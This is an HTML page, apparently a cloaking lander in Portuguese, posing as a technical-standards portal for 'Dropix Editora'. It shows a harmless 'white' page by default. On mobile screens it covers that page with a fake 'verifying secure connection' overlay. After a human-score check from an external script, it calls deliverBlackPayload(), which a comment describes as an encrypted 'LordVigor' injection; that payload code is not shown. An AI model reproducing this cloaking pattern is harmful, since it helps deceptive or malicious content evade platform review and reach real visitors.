<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dropix Editora | Portal Técnico</title>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 0; background: #f4f7f9; }
        #white-content { padding: 20px; display: block; } /* VISÍVEL POR PADRÃO */
        #checker-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #f4f7f9; z-index: 9999; display: none; /* ESCONDIDO POR PADRÃO */
            flex-direction: column; align-items: center; justify-content: center; text-align: center;
        }
        .loader { border: 4px solid #e1e8ed; border-top: 4px solid #004a80; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-verify { padding: 18px 35px; background: #004a80; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="white-content">
        <h2 style="color:#004a80">Dropix Editora</h2>
        <p>Aviso: Repositório de normas técnicas em manutenção preventiva ABNT 2026.</p>
    </div>

    <div id="checker-overlay">
        <div class="loader"></div>
        <p id="status-text" style="margin-top: 20px; color: #555;">Verificando conexão segura...</p>
        <button id="btn-verify" class="btn-verify" style="display:none">LIBERAR ACESSO</button>
    </div>

    <script src="engine.js"></script>
    <script>
        window.onload = async () => {
            // Se for mobile, mostramos o overlay de carregamento por cima do White
            if (window.innerWidth < 1024) {
                document.getElementById('checker-overlay').style.display = 'flex';
                
                await new Promise(r => setTimeout(r, 1000));
                
                const btn = document.getElementById('btn-verify');
                btn.style.display = 'block';
                document.querySelector('.loader').style.display = 'none';

                btn.onclick = async (e) => {
                    const score = await checkHumanScore(e);
                    if (score >= 50) {
                        deliverBlackPayload(); // Chama a injeção do LordVigor cifrada
                    } else {
                        document.getElementById('checker-overlay').style.display = 'none';
                    }
                };
            }
        };
    </script>
</body>
</html>
